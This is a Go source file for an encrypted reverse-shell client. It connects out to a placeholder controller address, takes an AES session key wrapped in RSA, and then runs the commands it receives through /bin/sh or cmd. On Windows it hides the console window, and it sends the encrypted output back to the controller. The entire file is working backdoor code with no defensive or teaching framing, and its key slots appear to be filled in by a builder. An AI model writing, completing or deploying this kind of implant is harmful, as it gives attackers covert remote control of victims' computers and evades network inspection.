package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
)

//BUFFSIZE is the buffer for communication
const BUFFSIZE = 512

//MASKMANAGERIP connection string to the maskmanager
const MASKMANAGERIP = "IPPORT"

//PUBLIC KEY
var MNGRPUBLICKEY = []byte(`BUTYMNGRPUBKEY`)

//PRIVATE KEY
var PRIVATEKEY = []byte(`BUTYCLIENTPVTKEY`)

func main() {
	conn, err := net.Dial("tcp", MASKMANAGERIP)
	if err != nil {
		fmt.Println(err)
	}
	getmaskedshell(conn)

}

func encryptconnection(keyval, texttoencrypt string) string {
	//fmt.Println("Encryption Program v0.01")

	text := []byte(texttoencrypt)
	key := []byte(keyval)

	// generate a new aes cipher using our 32 byte long key
	cipherBlock, err := aes.NewCipher(key)
	// if there are any errors, handle them
	if err != nil {
		fmt.Println(err)
	}

	// gcm or Galois/Counter Mode, is a mode of operation
	// for symmetric key cryptographic block ciphers
	// - https://en.wikipedia.org/wiki/Galois/Counter_Mode
	gcm, err := cipher.NewGCM(cipherBlock)
	// if any error generating new GCM
	// handle them
	if err != nil {
		fmt.Println(err)
	}

	// creates a new byte array the size of the nonce
	// which must be passed to Seal
	nonce := make([]byte, gcm.NonceSize())
	// populates our nonce with a cryptographically secure
	// random sequence
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		fmt.Println(err)
	}

	// here we encrypt our text using the Seal function
	// Seal encrypts and authenticates plaintext, authenticates the
	// additional data and appends the result to dst, returning the updated
	// slice. The nonce must be NonceSize() bytes long and unique for all
	// time, for a given key.
	return string(gcm.Seal(nonce, nonce, text, nil))
}

func decryptconnection(keyval, texttodecrypt string) string {
	key := []byte(keyval)
	ciphertext := []byte(texttodecrypt)
	// if our program was unable to read the file
	// print out the reason why it can't
	c, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(err)
	}

	gcm, err := cipher.NewGCM(c)
	if err != nil {
		fmt.Println(err)
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		fmt.Println(err)
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		fmt.Println(err)
	}
	return (string(plaintext))
}

func encryptMessage(origData []byte) ([]byte, error) {
	block, _ := pem.Decode(MNGRPUBLICKEY)
	if block == nil {
		return nil, errors.New("public key error")
	}
	pubInterface, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, err
	}
	pub := pubInterface.(*rsa.PublicKey)
	return rsa.EncryptPKCS1v15(rand.Reader, pub, origData)
}

func decryptMessage(ciphertext []byte) ([]byte, error) {
	block, _ := pem.Decode(PRIVATEKEY)
	if block == nil {
		return nil, errors.New("private key error!")
	}
	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		return nil, err
	}
	return rsa.DecryptPKCS1v15(rand.Reader, priv, ciphertext)
}

func getmaskedshell(conn net.Conn) {
	var keybuff, cmdbuff []byte
	var command string
	cmdbuff = make([]byte, BUFFSIZE)
	keybuff = make([]byte, 1024)
	var osshell string
	//fmt.Println("Welcome to Mask")

	keybytes, _ := conn.Read(keybuff[0:])
	decryptedkey, err := decryptMessage(keybuff[0:keybytes])
	if err != nil {
		fmt.Println(err)
	}
	keyval := string(decryptedkey)

	for {
		recvdbytes, _ := conn.Read(cmdbuff[0:])
		decryptedcmd := decryptconnection(keyval, string(cmdbuff[0:recvdbytes]))
		command = string(decryptedcmd)
		//fmt.Println(command)
		if strings.Index(command, "bye") == 0 {
			msgtoencrypt := "Good Bye :("
			result := encryptconnection(keyval, msgtoencrypt)
			if err != nil {
				fmt.Println(err)
			}
			conn.Write([]byte(result))
			conn.Close()
			os.Exit(0)
		} else {
			j := 0

			osshellargs := []string{"/C", command}

			if runtime.GOOS == "linux" {
				osshell = "/bin/sh"
				osshellargs = []string{"-c", command}

			} else {
				osshell = "cmd"
			}
			execcmd := exec.Command(osshell, osshellargs...)

			if runtime.GOOS == "windows" {
				execcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			}

			cmdout, _ := execcmd.Output()
			encresult := encryptconnection(keyval, string(cmdout))
			actualres := []byte(encresult)
			//fmt.Println(decryptconnection(keyval, string(actualres)))
			if len(actualres) <= 512 {
				conn.Write([]byte(actualres))
			} else {

				i := BUFFSIZE
				for {
					if i > len(actualres) {
						conn.Write(actualres[j:len(actualres)])
						break
					} else {

						conn.Write(actualres[j:i])
						j = i
					}
					i = i + BUFFSIZE
				}

			}
			actualres = actualres[:0]
			cmdout = cmdout[:0]
		}

	}
}
